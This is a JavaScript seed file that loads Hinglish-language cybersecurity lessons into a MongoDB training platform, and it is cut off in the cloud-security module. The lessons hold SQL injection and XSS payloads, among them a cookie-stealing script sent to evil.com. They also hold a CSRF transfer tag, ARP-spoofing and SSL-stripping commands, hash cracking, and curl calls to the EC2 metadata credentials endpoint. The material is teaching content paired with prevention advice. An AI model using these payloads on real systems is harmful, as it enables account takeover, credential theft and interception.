require('dotenv').config();
const mongoose = require('mongoose');
const Domain = require('./models/Domain.model');
const LearningModule = require('./models/LearningModule.model');

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/cyberverse';

const getModules = (domainMap) => [

  // ═══════════════════════════════════════════════════════════
  // 1. WEB SECURITY
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['web-security'],
    title: 'SQL Injection — Complete Guide',
    order: 1,
    estimated_time: 45,
    content_markdown: `# SQL Injection (SQLi)

SQL Injection ek aisi vulnerability hai jisme attacker database queries mein malicious SQL code inject karta hai.

## Kaise kaam karta hai?

Normal login query:
\`\`\`sql
SELECT * FROM users WHERE username='admin' AND password='1234';
\`\`\`

Attacker input deta hai: \`' OR '1'='1\`

Ab query ban jaati hai:
\`\`\`sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='';
\`\`\`

Kyunki \`'1'='1'\` hamesha true hota hai — attacker bina password ke login kar leta hai!

## Types of SQL Injection

### 1. Classic / In-Band SQLi
Directly results page pe dikhte hain.
\`\`\`
' OR 1=1--
' UNION SELECT username, password FROM users--
\`\`\`

### 2. Blind SQLi
Koi output nahi dikhta, lekin behavior se pata chalta hai.
\`\`\`
' AND 1=1--   (page normal)
' AND 1=2--   (page break)
\`\`\`

### 3. Time-Based Blind SQLi
\`\`\`sql
' AND SLEEP(5)--   (agar 5 sec delay aaye toh vulnerable hai)
\`\`\`

## Real Attack Example

Login bypass:
\`\`\`
Username: admin'--
Password: anything
\`\`\`

Query ban jaati hai:
\`\`\`sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
\`\`\`
\`--\` ke baad sab comment ho jaata hai → password check skip!

## Prevention

- **Prepared Statements** use karo:
\`\`\`python
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (user, pwd))
\`\`\`
- **Input Validation** — special characters filter karo
- **ORM** use karo (Django, Sequelize, Hibernate)
- **Least Privilege** — DB user ko sirf zaruri permissions do

## Tools
- **SQLMap** — automatic SQLi detection & exploitation
- **Burp Suite** — request intercept & modify
- **HackBar** — browser extension for quick testing

## Practice Karo
Ab Practice section mein jao aur SQLi challenges try karo!`,
    video_url: 'https://www.youtube.com/embed/ciNHn38EyRc',
    resources_links: [
      { title: 'PortSwigger SQLi Labs', url: 'https://portswigger.net/web-security/sql-injection', type: 'article' },
      { title: 'OWASP SQLi Guide', url: 'https://owasp.org/www-community/attacks/SQL_Injection', type: 'article' },
      { title: 'SQLMap Tool', url: 'https://sqlmap.org', type: 'tool' },
    ],
  },
  {
    domain_id: domainMap['web-security'],
    title: 'XSS — Cross-Site Scripting',
    order: 2,
    estimated_time: 40,
    content_markdown: `# Cross-Site Scripting (XSS)

XSS ek vulnerability hai jisme attacker victim ke browser mein malicious JavaScript inject karta hai.

## 3 Types of XSS

### 1. Reflected XSS
Input directly response mein reflect hota hai.
\`\`\`
URL: https://site.com/search?q=<script>alert(1)</script>
\`\`\`
Server output karta hai:
\`\`\`html
<p>Results for: <script>alert(1)</script></p>
\`\`\`

### 2. Stored XSS (Persistent)
Payload database mein save ho jaata hai — har visitor ke liye execute hota hai.
\`\`\`html
Comment field mein: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
\`\`\`

### 3. DOM-Based XSS
JavaScript khud vulnerable hota hai:
\`\`\`javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);
// URL: https://site.com/#<img src=x onerror=alert(1)>
\`\`\`

## Impact kya hota hai?

- **Cookie Theft** → Session hijack
- **Keylogging** → Password capture
- **Phishing** → Fake login form inject
- **Defacement** → Page content change

## Common Payloads

\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
\`\`\`

## Prevention

- **Output Encoding** — HTML entities use karo: \`<\` → \`&lt;\`
- **CSP** (Content Security Policy) headers lagao
- **HttpOnly Cookie** — JavaScript se cookies na read ho sake
- **DOMPurify** library use karo user-generated content ke liye

## Tools
- **Burp Suite** — XSS scanner
- **XSStrike** — advanced XSS finder
- **dalfox** — fast XSS scanner`,
    video_url: 'https://www.youtube.com/embed/EoaDgUgS6QA',
    resources_links: [
      { title: 'PortSwigger XSS Labs', url: 'https://portswigger.net/web-security/cross-site-scripting', type: 'article' },
      { title: 'XSS Cheat Sheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', type: 'article' },
    ],
  },
  {
    domain_id: domainMap['web-security'],
    title: 'CSRF, IDOR & Broken Auth',
    order: 3,
    estimated_time: 35,
    content_markdown: `# CSRF, IDOR & Broken Authentication

## CSRF — Cross-Site Request Forgery

Attacker victim se unwanted actions karwata hai already logged-in site pe.

**Attack flow:**
1. Victim bank mein logged in hai
2. Attacker evil page open karwata hai
3. Evil page silently request bhejti hai:
\`\`\`html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
\`\`\`
4. Browser automatically cookies bhej deta hai → Transaction complete!

**Prevention:**
- CSRF Token use karo (random, per-request)
- SameSite Cookie attribute: \`Set-Cookie: session=abc; SameSite=Strict\`
- Origin/Referer header check karo

---

## IDOR — Insecure Direct Object Reference

Server-side authorization check nahi hota object access karte waqt.

**Example:**
\`\`\`
GET /api/invoice/1042   → apna invoice ✅
GET /api/invoice/1001   → kisi aur ka invoice 😈
\`\`\`

Bas number change karo — kisi bhi user ka data dekh sakte ho!

**Prevention:**
- Har request pe authorization check karo
- Sequential IDs ki jagah UUID use karo
- Object-level permission check karo

---

## Broken Authentication

Weak session management ya authentication flaws.

**Common issues:**
- Weak passwords allowed
- No brute-force protection
- Session ID URL mein expose
- Password reset link expire nahi hota

**Prevention:**
- Strong password policy + MFA
- Rate limiting on login
- Secure, HttpOnly, SameSite cookies
- Short-lived tokens`,
    video_url: 'https://www.youtube.com/embed/eWEgUcHPle0',
    resources_links: [
      { title: 'OWASP CSRF', url: 'https://owasp.org/www-community/attacks/csrf', type: 'article' },
      { title: 'PortSwigger IDOR', url: 'https://portswigger.net/web-security/access-control/idor', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 2. NETWORK SECURITY
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['network-security'],
    title: 'Network Fundamentals for Hackers',
    order: 1,
    estimated_time: 50,
    content_markdown: `# Network Fundamentals for Hackers

Network security samajhne ke liye pehle networking basics clear honi chahiye.

## OSI Model (7 Layers)

| Layer | Naam | Example |
|-------|------|---------|
| 7 | Application | HTTP, FTP, DNS |
| 6 | Presentation | SSL/TLS, Encoding |
| 5 | Session | NetBIOS, RPC |
| 4 | Transport | TCP, UDP |
| 3 | Network | IP, ICMP |
| 2 | Data Link | Ethernet, MAC |
| 1 | Physical | Cables, WiFi |

## TCP vs UDP

**TCP** — Reliable, connection-oriented
- 3-Way Handshake: SYN → SYN-ACK → ACK
- Use: HTTP, FTP, SSH

**UDP** — Fast, connectionless
- No guarantee of delivery
- Use: DNS, Gaming, Video streaming

## Important Ports Yaad Karo

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 443 | HTTPS |
| 3306 | MySQL |
| 3389 | RDP |
| 8080 | HTTP Alternate |

## Nmap — Port Scanner

\`\`\`bash
# Basic scan
nmap 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# All ports, aggressive
nmap -A -p- 192.168.1.1

# Stealth scan
nmap -sS 192.168.1.1
\`\`\`

## Wireshark — Packet Analysis

Useful filters:
\`\`\`
http              → HTTP traffic
ftp               → FTP traffic
tcp.port == 22    → SSH
ip.addr == 1.2.3.4 → Specific IP
http.request.method == "POST" → POST requests
\`\`\`

## ARP Spoofing

Attacker khud ko gateway bata kar traffic intercept karta hai (MITM attack).
\`\`\`bash
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
\`\`\``,
    video_url: 'https://www.youtube.com/embed/qiQR5rTSshw',
    resources_links: [
      { title: 'Nmap Official Docs', url: 'https://nmap.org/book/man.html', type: 'tool' },
      { title: 'Wireshark User Guide', url: 'https://www.wireshark.org/docs/wsug_html_chunked/', type: 'article' },
      { title: 'TryHackMe Network Module', url: 'https://tryhackme.com/module/network-security', type: 'article' },
    ],
  },
  {
    domain_id: domainMap['network-security'],
    title: 'MITM Attacks & Traffic Analysis',
    order: 2,
    estimated_time: 40,
    content_markdown: `# Man-in-the-Middle (MITM) Attacks

MITM attack mein attacker do parties ke beech mein baith jaata hai aur communication intercept karta hai.

## Attack Types

### 1. ARP Poisoning
Local network pe attacker apna MAC address gateway ki jagah broadcast karta hai.

\`\`\`bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <victim_ip>
\`\`\`

### 2. DNS Spoofing
DNS responses tamper karke fake website pe redirect karo.

### 3. SSL Stripping
HTTPS ko HTTP mein downgrade karo.
\`\`\`bash
sslstrip -l 8080
\`\`\`

## Practical: HTTP Traffic Sniff

\`\`\`bash
# Wireshark se HTTP credentials capture
# Filter: http.request.method == "POST"
# Look for: username, password fields in packet data
\`\`\`

## Tools

| Tool | Use |
|------|-----|
| Bettercap | All-in-one MITM framework |
| Ettercap | ARP poisoning |
| MITMProxy | HTTP/HTTPS proxy |
| Wireshark | Packet analysis |

## Detection & Prevention

- **HTTPS everywhere** — SSL/TLS use karo
- **HSTS** header — browser force karta hai HTTPS
- **Certificate Pinning** — fake certs reject
- **VPN** — encrypted tunnel
- **Static ARP entries** — ARP spoofing prevent

## SSH Tunneling

Safe tunnel banao:
\`\`\`bash
# Local port forwarding
ssh -L 8080:internal-server:80 user@jumphost

# Dynamic SOCKS proxy
ssh -D 1080 user@server
\`\`\``,
    video_url: 'https://www.youtube.com/embed/B4O2-0UKSqQ',
    resources_links: [
      { title: 'Bettercap Framework', url: 'https://www.bettercap.org', type: 'tool' },
      { title: 'MITM Attack Explained', url: 'https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 3. CRYPTOGRAPHY
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['cryptography'],
    title: 'Classical Ciphers & Cracking',
    order: 1,
    estimated_time: 35,
    content_markdown: `# Classical Ciphers & How to Crack Them

## Caesar Cipher

Har letter ko N positions shift karo.

\`\`\`
Key = 3
A → D, B → E, C → F ...
HELLO → KHOOR
\`\`\`

**Crack kaise karein:** Sirf 25 possibilities hain — brute force!
\`\`\`python
ciphertext = "KHOOR"
for shift in range(26):
    decrypted = ''.join(chr((ord(c) - 65 - shift) % 26 + 65) for c in ciphertext)
    print(f"Shift {shift}: {decrypted}")
\`\`\`

## Vigenère Cipher

Repeating keyword se multiple Caesar shifts.

\`\`\`
Key:   HACK HACK HACK
Plain: HELLO WORLD
Cipher: (H+H), (E+A), (L+C), (L+K), (O+H) ...
\`\`\`

**Crack:** Kasiski test se key length nikalo, phir frequency analysis.

## ROT13

Caesar cipher with shift = 13. ROT13(ROT13(x)) = x

\`\`\`
HELLO → URYYB → HELLO
\`\`\`

## Substitution Cipher

Har letter ko kisi aur letter se replace karo.

**Crack:** English frequency analysis — E sabse zyada common hai (12.7%), phir T, A, O, I, N...

## Base64

Encoding hai, encryption nahi! Easily decodable.
\`\`\`
HELLO → SEVMTE8=
\`\`\`
\`\`\`python
import base64
base64.b64decode("SEVMTE8=")  # b'HELLO'
\`\`\`

## Hex Encoding

\`\`\`
H    E    L    L    O
48   45   4C   4C   4F
\`\`\`

## Quick Identification

| Pattern | Likely Encoding |
|---------|----------------|
| Only A-Z no spaces | Caesar/Vigenère |
| = at end | Base64 |
| 0-9 a-f pairs | Hex |
| Looks reversed | ROT13/ROT47 |
| Numbers only | ASCII decimal |`,
    video_url: 'https://www.youtube.com/embed/jhXCTbFnK8o',
    resources_links: [
      { title: 'CryptoHack — Free Crypto Challenges', url: 'https://cryptohack.org', type: 'article' },
      { title: 'dCode — Online Cipher Tools', url: 'https://www.dcode.fr/en', type: 'tool' },
      { title: 'CyberChef — Data Transformation', url: 'https://gchq.github.io/CyberChef/', type: 'tool' },
    ],
  },
  {
    domain_id: domainMap['cryptography'],
    title: 'Modern Cryptography — AES, RSA, Hashing',
    order: 2,
    estimated_time: 50,
    content_markdown: `# Modern Cryptography

## Symmetric Encryption — AES

Ek hi key se encrypt aur decrypt hota hai.

\`\`\`
Plaintext + Key → [AES] → Ciphertext
Ciphertext + Key → [AES] → Plaintext
\`\`\`

**AES Modes:**
- **ECB** — Har block independently encrypt hota hai (UNSAFE — patterns leak)
- **CBC** — Har block previous se XOR hota hai (better)
- **GCM** — Authenticated encryption (best)

**ECB Penguin Problem:** Same plaintext = same ciphertext → image patterns visible rahte hain!

## Asymmetric Encryption — RSA

Do keys: Public key (sabko pata) + Private key (secret)

\`\`\`
Encrypt: Plaintext + Public Key → Ciphertext
Decrypt: Ciphertext + Private Key → Plaintext
\`\`\`

**Math behind RSA:**
\`\`\`
n = p × q        (p, q bade prime numbers)
e = public exponent (usually 65537)
d = private exponent
m^e mod n = c   (encrypt)
c^d mod n = m   (decrypt)
\`\`\`

**RSA Attacks:**
- **Small n** — Factor n = p × q using online factoring
- **Common modulus** — Same n different e
- **Wiener's attack** — Small private exponent d

\`\`\`python
from sympy import factorint
n = 3233
factors = factorint(n)  # {61: 1, 53: 1} → p=61, q=53
\`\`\`

## Hashing

One-way function — original recover nahi hota.

| Algorithm | Output Size | Status |
|-----------|-------------|--------|
| MD5 | 128-bit | BROKEN |
| SHA1 | 160-bit | WEAK |
| SHA256 | 256-bit | SAFE |
| bcrypt | Variable | SAFE (passwords) |

**Hash Cracking:**
\`\`\`bash
# Hashcat
hashcat -m 0 hash.txt wordlist.txt        # MD5
hashcat -m 1000 hash.txt wordlist.txt     # NTLM

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
\`\`\`

**Rainbow Tables** — precomputed hash → plaintext mappings.
**Salt** — random string + password se hash banao → rainbow tables useless ho jaati hain.

## JWT (JSON Web Token)

\`\`\`
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxxxx
\`\`\`

**Common Vulnerabilities:**
- **Algorithm None** — signature verification skip
- **HS256 vs RS256 confusion** — public key as HMAC secret
- **Weak secret** — brute force with hashcat`,
    video_url: 'https://www.youtube.com/embed/AQDCe585Lnc',
    resources_links: [
      { title: 'CryptoHack RSA Challenges', url: 'https://cryptohack.org/challenges/rsa/', type: 'article' },
      { title: 'Hashcat Wiki', url: 'https://hashcat.net/wiki/', type: 'tool' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 4. REVERSE ENGINEERING
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['reverse-engineering'],
    title: 'Reverse Engineering Basics',
    order: 1,
    estimated_time: 55,
    content_markdown: `# Reverse Engineering — Beginner Guide

Reverse Engineering = Compiled binary ko analyze karke uski original logic samajhna.

## File Types

\`\`\`bash
file binary_name
# ELF 64-bit LSB executable (Linux)
# PE32 executable (Windows .exe)
# Mach-O (macOS)
\`\`\`

## Step 1: Static Analysis

Binary run kiye bina analyze karo.

### strings command
\`\`\`bash
strings binary | head -50
# Interesting: passwords, flags, URLs, function names
\`\`\`

### objdump — Disassembly
\`\`\`bash
objdump -d binary          # Disassemble
objdump -d binary | grep -A 30 "<main>"   # Main function
\`\`\`

### readelf — ELF Info
\`\`\`bash
readelf -s binary    # Symbols (function names)
readelf -h binary    # Header info
\`\`\`

## Step 2: Dynamic Analysis

Binary chalao aur behavior dekho.

### ltrace — Library calls
\`\`\`bash
ltrace ./binary
# strcmp("your_input", "secret_password") calls visible!
\`\`\`

### strace — System calls
\`\`\`bash
strace ./binary
# File opens, network calls, etc.
\`\`\`

### GDB — Debugger
\`\`\`bash
gdb ./binary
(gdb) break main       # Breakpoint
(gdb) run              # Start
(gdb) disassemble main # Show assembly
(gdb) x/s 0x401234    # Print string at address
(gdb) ni               # Next instruction
\`\`\`

## x86-64 Assembly Basics

\`\`\`nasm
mov rax, 5      ; rax = 5
add rax, rbx    ; rax = rax + rbx
cmp rax, rbx    ; Compare (sets flags)
je  label       ; Jump if equal
jne label       ; Jump if not equal
call func       ; Call function
ret             ; Return
\`\`\`

## Common Patterns

**Password check:**
\`\`\`nasm
lea rdi, [input]        ; 1st arg = user input
lea rsi, [secret]       ; 2nd arg = correct password
call strcmp             ; Compare
test eax, eax           ; eax == 0 means equal
jne wrong_password      ; Jump if not equal
\`\`\`

**Transform + Compare (jaise chall.c mein):**
\`\`\`c
// Binary mein yahi hota hai:
transform(user_input);  // har char modify karo
strcmp(user_input, stored_value);  // phir compare
\`\`\`

## Tools

| Tool | Use |
|------|-----|
| Ghidra | Free decompiler (NSA) |
| IDA Pro | Industry standard |
| Radare2 | CLI framework |
| Binary Ninja | Modern GUI |
| GDB + pwndbg | Debugging |`,
    video_url: 'https://www.youtube.com/embed/d4Pgi5XML8E',
    resources_links: [
      { title: 'Ghidra — Free Download', url: 'https://ghidra-sre.org', type: 'tool' },
      { title: 'pwn.college RE Module', url: 'https://pwn.college/reverse-engineering/', type: 'article' },
      { title: 'x86 Assembly Guide', url: 'https://www.cs.virginia.edu/~evans/cs216/guides/x86.html', type: 'article' },
    ],
  },
  {
    domain_id: domainMap['reverse-engineering'],
    title: 'Ghidra & Advanced RE Techniques',
    order: 2,
    estimated_time: 60,
    content_markdown: `# Ghidra & Advanced Reverse Engineering

## Ghidra Setup

1. Download: https://ghidra-sre.org
2. Extract & run: \`./ghidraRun\`
3. New Project → Import File → Binary select karo
4. Double-click → Analyze karo

## Ghidra Features

- **Decompiler** — Assembly ko C-like code mein convert karta hai
- **Symbol Tree** — All functions list
- **Cross References** — Kahan se function call ho raha hai
- **Bookmarks** — Important locations mark karo

## Practical Workflow

\`\`\`
1. strings binary → interesting strings note karo
2. Ghidra mein import karo
3. Symbol Tree mein "main" dhundho
4. Decompiler window dekho — C code jaisi dikhegi
5. Suspicious comparisons/functions trace karo
6. String references → useful strings se functions tak pahuncho
\`\`\`

## Anti-Reversing Techniques

Developers RE mushkil banane ke liye:

**Obfuscation:**
- Dead code insert
- Meaningless variable names
- String encryption

**Anti-Debugging:**
\`\`\`c
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
    exit(0);  // debugger detect ho gaya
\`\`\`

**Packing:**
- UPX packer: binary compressed hoti hai
\`\`\`bash
upx -d packed_binary  # Unpack karo
\`\`\`

## Patching Binaries

Conditions bypass karne ke liye binary directly edit karo:

\`\`\`bash
# GDB se instruction patch karo
(gdb) set {unsigned char}0x401234 = 0x90  # NOP instruction

# Hex editor se
xxd binary | grep -n "74 05"   # je (jump if equal) dhundho
# 74 → EB (jmp unconditional) se replace karo
\`\`\`

## CTF RE Strategy

\`\`\`
1. file → type check
2. strings → quick wins
3. ltrace/strace → runtime behavior
4. Ghidra decompile → logic samjho
5. GDB dynamic → runtime values dekho
6. Patch if needed → bypass checks
\`\`\``,
    video_url: 'https://www.youtube.com/embed/fTGTnrgjuGA',
    resources_links: [
      { title: 'Ghidra Official Docs', url: 'https://ghidra-sre.org/CheatSheet.html', type: 'article' },
      { title: 'RE Challenges — crackmes.one', url: 'https://crackmes.one', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 5. FORENSICS
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['forensics'],
    title: 'Digital Forensics Fundamentals',
    order: 1,
    estimated_time: 45,
    content_markdown: `# Digital Forensics — Complete Beginner Guide

Digital Forensics = Digital evidence collect, preserve, aur analyze karna.

## Core Concepts

### Chain of Custody
Evidence ko tamper-proof tarike se handle karo — har step document karo.

### Write Blockers
Original evidence modify na ho isliye read-only mode mein analyze karo.

### Hashing for Integrity
\`\`\`bash
md5sum evidence.img    # Original hash note karo
# Analysis ke baad dobara hash karo — same hona chahiye
\`\`\`

## File Analysis

### file command
\`\`\`bash
file unknown_file
# JPEG image data, PNG image data, PDF document, etc.
\`\`\`

### Hex dump
\`\`\`bash
xxd file.jpg | head -20
# FF D8 FF E0 → JPEG magic bytes
# 89 50 4E 47 → PNG magic bytes
\`\`\`

### Common Magic Bytes
| File | Hex |
|------|-----|
| JPEG | FF D8 FF |
| PNG | 89 50 4E 47 |
| PDF | 25 50 44 46 |
| ZIP | 50 4B 03 04 |
| ELF | 7F 45 4C 46 |

## Steganography

Data ko image/audio mein hide karna.

\`\`\`bash
# steghide — hide/extract
steghide extract -sf image.jpg

# binwalk — embedded files dhundho
binwalk -e image.jpg

# zsteg — PNG LSB steganography
zsteg image.png

# exiftool — metadata
exiftool image.jpg
\`\`\`

## Disk Forensics

\`\`\`bash
# Disk image banana
dd if=/dev/sdb of=disk.img bs=4096

# Deleted files recover
foremost -i disk.img -o recovered/

# Autopsy — GUI tool
autopsy  # Browser-based interface
\`\`\`

## Memory Forensics

\`\`\`bash
# Volatility — memory analysis framework
volatility -f memory.dmp imageinfo          # OS detect
volatility -f memory.dmp --profile=Win7SP1x64 pslist   # Process list
volatility -f memory.dmp --profile=Win7SP1x64 netscan  # Network connections
volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q 0x123 -D output/
\`\`\`

## Network Forensics — PCAP Analysis

\`\`\`bash
# Wireshark filters
http.request.method == "POST"    # POST requests
ftp-data                          # FTP file transfers
smtp                              # Emails

# tshark (CLI Wireshark)
tshark -r capture.pcap -Y "http" -T fields -e http.host
\`\`\``,
    video_url: 'https://www.youtube.com/embed/Cn9R0hSmUFQ',
    resources_links: [
      { title: 'Autopsy Forensics Tool', url: 'https://www.autopsy.com', type: 'tool' },
      { title: 'Volatility Framework', url: 'https://www.volatilityfoundation.org', type: 'tool' },
      { title: 'CTF Forensics Guide', url: 'https://ctf-wiki.org/forensics/introduction/', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 6. OSINT
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['osint'],
    title: 'OSINT — Open Source Intelligence',
    order: 1,
    estimated_time: 40,
    content_markdown: `# OSINT — Open Source Intelligence

OSINT = Publicly available information se target ke baare mein maximum information gather karna.

## OSINT Framework

Website: https://osintframework.com — saare tools ek jagah!

## People OSINT

### Email se Information
\`\`\`
1. Email format guess karo: firstname.lastname@company.com
2. Hunter.io — company email patterns
3. HaveIBeenPwned — breaches check karo
4. Epieos — Google account info from email
\`\`\`

### Username Search
\`\`\`bash
# Sherlock — 300+ platforms pe username dhundho
python sherlock username

# WhatsMyName — username search
\`\`\`

### Phone Number
- Truecaller
- NumLookup
- Sync.me

## Domain / IP OSINT

\`\`\`bash
# WHOIS — domain registration info
whois example.com

# DNS lookup
nslookup example.com
dig example.com ANY

# Subdomains
# Amass
amass enum -d example.com
# Subfinder
subfinder -d example.com
\`\`\`

### Shodan — Internet Search Engine
\`\`\`
shodan search "apache 2.4" country:IN
shodan search "default password" port:23
\`\`\`

## Google Dorks

Special Google searches:

\`\`\`
site:example.com                    # Sirf is site ke results
filetype:pdf site:example.com       # PDF files
intitle:"index of" site:example.com # Directory listings
inurl:admin site:example.com        # Admin pages
"password" filetype:xls             # Excel files with password
\`\`\`

## Social Media OSINT

- **LinkedIn** — Company employees, org structure
- **Twitter/X** — Location metadata in old tweets
- **Instagram** — Geotagged photos
- **Facebook Graph Search** — People, places

## Image OSINT

\`\`\`bash
# Reverse image search
# Google Images, Yandex, TinEye

# Metadata from images
exiftool photo.jpg
# GPS coordinates, camera model, timestamp!
\`\`\`

## Maltego

Visual link analysis tool — connections map karo visually.

## CTF OSINT Tips

1. Username across platforms search karo
2. Image metadata check karo
3. Website source code dekho
4. Wayback Machine — old versions
5. Certificate Transparency logs — subdomains`,
    video_url: 'https://www.youtube.com/embed/qwA6MmbeGNo',
    resources_links: [
      { title: 'OSINT Framework', url: 'https://osintframework.com', type: 'tool' },
      { title: 'Shodan.io', url: 'https://shodan.io', type: 'tool' },
      { title: 'Bellingcat OSINT Guide', url: 'https://www.bellingcat.com/category/resources/how-tos/', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 7. MALWARE ANALYSIS
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['malware-analysis'],
    title: 'Malware Analysis — Complete Guide',
    order: 1,
    estimated_time: 60,
    content_markdown: `# Malware Analysis

Malware analysis = Malicious software ko samajhna — kya karta hai, kaise karta hai.

## ⚠️ Safety First!

Malware analyze karne ke liye HAMESHA:
- **Isolated VM** use karo (VirtualBox/VMware)
- **Snapshots** lo pehle
- **Network disable** karo ya fake network banao
- **Host machine pe kabhi mat chalao**

## Types of Malware

| Type | Description |
|------|-------------|
| Virus | Self-replicating, files infect karta hai |
| Worm | Network pe spread hota hai |
| Trojan | Legitimate software jaisa dikhta hai |
| Ransomware | Files encrypt, ransom maangta hai |
| Spyware | User activity monitor karta hai |
| RAT | Remote Access Trojan |
| Rootkit | System-level hide rehta hai |

## Static Analysis

Malware chalaye bina analyze karo.

\`\`\`bash
# File type
file malware.exe

# Strings
strings malware.exe | grep -E "(http|ftp|cmd|powershell)"

# PE Analysis (Windows executables)
# PEStudio — PE headers, imports, strings
# pestudio malware.exe

# Hash for identification
md5sum malware.exe
# VirusTotal pe search karo: https://virustotal.com
\`\`\`

### Imports Analysis
Malware kaunse Windows API calls karta hai:
- \`CreateRemoteThread\` → Code injection
- \`WriteProcessMemory\` → Process injection
- \`RegSetValueEx\` → Registry persistence
- \`URLDownloadToFile\` → Downloads files
- \`CryptEncrypt\` → Encryption (ransomware?)

## Dynamic Analysis

Malware chalao aur behavior monitor karo.

### Process Monitor (ProcMon)
- File system changes
- Registry modifications
- Network connections

### Tools
\`\`\`
Process Hacker    → Running processes, memory
Wireshark         → Network traffic
Regshot           → Registry changes before/after
FakeNet-NG        → Fake network to capture traffic
x64dbg            → Debugger for Windows
\`\`\`

## Online Sandboxes

Malware safely analyze karo online:
- **Any.run** — Interactive sandbox
- **VirusTotal** — Multi-AV scan
- **Hybrid Analysis** — Detailed report
- **Joe Sandbox** — Enterprise grade

## Common Techniques

### Persistence Mechanisms
\`\`\`
Registry Run keys:
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

Startup folder:
C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

Scheduled Tasks:
schtasks /create /tn "Updater" /tr malware.exe /sc onlogon
\`\`\`

### C2 Communication
Command & Control server se malware instructions leta hai.
- HTTP/HTTPS beacons
- DNS tunneling
- IRC channels`,
    video_url: 'https://www.youtube.com/embed/J6mh8dGljYY',
    resources_links: [
      { title: 'Any.run Sandbox', url: 'https://any.run', type: 'tool' },
      { title: 'VirusTotal', url: 'https://virustotal.com', type: 'tool' },
      { title: 'Malware Traffic Analysis', url: 'https://malware-traffic-analysis.net', type: 'article' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 8. CLOUD SECURITY
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['cloud-security'],
    title: 'Cloud Security & AWS Attacks',
    order: 1,
    estimated_time: 55,
    content_markdown: `# Cloud Security

Cloud security = AWS, Azure, GCP jaisi cloud platforms ko secure karna aur attack vectors samajhna.

## AWS Basics

### Key Services
| Service | Description |
|---------|-------------|
| EC2 | Virtual machines |
| S3 | Object storage |
| IAM | Identity & Access Management |
| Lambda | Serverless functions |
| RDS | Managed databases |
| VPC | Virtual Private Cloud |

## Common Misconfigurations

### 1. Public S3 Buckets
\`\`\`bash
# Publicly accessible bucket
https://bucket-name.s3.amazonaws.com/

# Enumerate buckets
aws s3 ls s3://bucket-name --no-sign-request

# Download files
aws s3 cp s3://bucket-name/file.txt . --no-sign-request
\`\`\`

**Fix:** S3 Block Public Access enable karo

### 2. Exposed AWS Keys

.env files ya GitHub mein leaked keys:
\`\`\`bash
# Keys kaisi dikhti hain:
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Leaked key se identity check
aws sts get-caller-identity

# Enumerate permissions
aws iam list-attached-user-policies --user-name current-user
\`\`\`

### 3. SSRF → IMDS Attack

EC2 instance mein SSRF vulnerability se metadata steal:
\`\`\`bash
# IMDS endpoint (only accessible from EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

**Fix:** IMDSv2 enforce karo (token-based)

### 4. Over-privileged IAM

\`\`\`json
// BAD — Admin access to everything
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// GOOD — Least privilege
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::my-bucket/*"
}
\`\`\`

## AWS Penetration Testing Tools

\`\`\`bash
# ScoutSuite — multi-cloud security audit
scout aws

# Pacu — AWS exploitation framework
python3 pacu.py

# CloudMapper — visualize AWS environment
python3 cloudmapper.py collect --account my-account

# Prowler — AWS security checks
./prowler -g cislevel2
\`\`\`

## Azure & GCP

**Azure:**
- Managed Identities abuse
- Storage Account SAS token leaks
- Key Vault misconfigurations

**GCP:**
- Service Account key exposure
- Cloud Storage public buckets
- Metadata server: \`http://metadata.google.internal\``,
    video_url: 'https://www.youtube.com/embed/aE-E-E5DLfQ',
    resources_links: [
      { title: 'flaws.cloud — AWS CTF', url: 'http://flaws.cloud', type: 'article' },
      { title: 'CloudGoat — Vulnerable AWS', url: 'https://github.com/RhinoSecurityLabs/cloudgoat', type: 'tool' },
